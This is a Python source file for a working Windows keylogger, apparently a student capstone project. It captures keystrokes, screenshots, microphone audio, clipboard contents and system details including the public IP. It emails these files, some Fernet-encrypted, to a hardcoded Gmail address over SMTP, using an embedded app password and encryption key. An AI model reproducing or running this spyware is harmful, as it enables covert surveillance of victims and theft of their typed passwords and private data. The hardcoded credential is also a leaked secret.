# Libraries
import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from webbrowser import get
# Default Module used to collect the computer's Information

import socket
import platform

import win32clipboard

# Import Libraries for screenshots
from PIL import ImageGrab

import getpass
from requests import get

# Importing Libraries for Microphone
import sounddevice as sd
from scipy.io.wavfile import write

import time
import os

from cryptography.fernet import Fernet

import getpass

from multiprocessing import Process, freeze_support

# setup port and server name

smtp_port = 587
smtp_server = "smtp.gmail.com"

# Create Key Log TXT
keys_information = "key_log.txt"
system_information = "get_system_information.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
audio_information = "audio.wav"

keys_information_e = "e_key_log.txt"
system_information_e = "e_get_system_information.txt"
clipboard_information_e = "e_clipboard.txt"



file_path = "D:\\sem 4\\capstone\\keylogger\\Project"
extend = "\\"
file_merge = file_path + extend


microphone_time = 10
time_iteration = 30
number_of_iterations_end = 1

email_from = "conestogakeylogger@gmail.com"
pswd = "efelgipnrwlzhhtn"

username = getpass.getuser()

subject = "New Email from group 6"

toaddr = "conestogakeylogger@gmail.com"

key = "6rUc3aqsScL_sXPDV2ow6t-4qUuq_X1wvHqyEiksW7w="


# Screenshot Start
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()


# Create Microphone

def microphone(file_path, extend, audio_information, microphone_time):
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)


# To start recording, call the microphone function with the desired parameters
microphone(file_path, extend, audio_information, microphone_time)


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipfy.org").text

            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address")
            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System Information: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostman: " + hostname + '\n')
            f.write("Private IP Address: " + IPAddr + '\n')


computer_information()


# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data_bytes = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()

            # Decode bytes to string
            pasted_data = pasted_data_bytes.decode('utf-8') if pasted_data_bytes else ""

            if pasted_data:
                f.write("Clipboard Data: \n" + pasted_data + '\n')
            else:
                f.write("Clipboard is empty\n")

        except Exception as e:
            f.write("Error copying clipboard data: {}\n".format(str(e)))


copy_clipboard()


def send_email(filename, attachment, toaddr):
    fromaddr = email_from
    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Email from Group 6"

    body = " Body of the email"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP(smtp_server, smtp_port)
    s.starttls()
    s.login(email_from, pswd)
    print("Successfully connected to server\n")
    print("Sending email to " + toaddr)

    text = msg.as_string()
    s.sendmail(email_from, toaddr, text)
    print("Email sent ! ")
    s.quit()




# Time
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        # append key by adding count 1
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    # Here We append the Key data in One File

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")

                if k == 'Key.space':
                    f.write('\n')
                elif k == 'Key.enter':
                    f.write('\n')
                elif k == 'Key.backspace':
                    # Handle backspace as needed
                    pass
                elif 'Key.shift' in k:
                    # Handle shift key press
                    pass
                else:
                    f.write(k)


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "a") as f:
            screenshot()
            send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
            send_email(audio_information, file_path + extend + audio_information, toaddr)
            send_email(keys_information, file_path + extend + keys_information, toaddr)
            copy_clipboard()
            number_of_iterations += 1
            currentTime = time.time()
            stoppingTime = time.time() + time_iteration


# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
                        file_merge + keys_information_e]


count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(60)

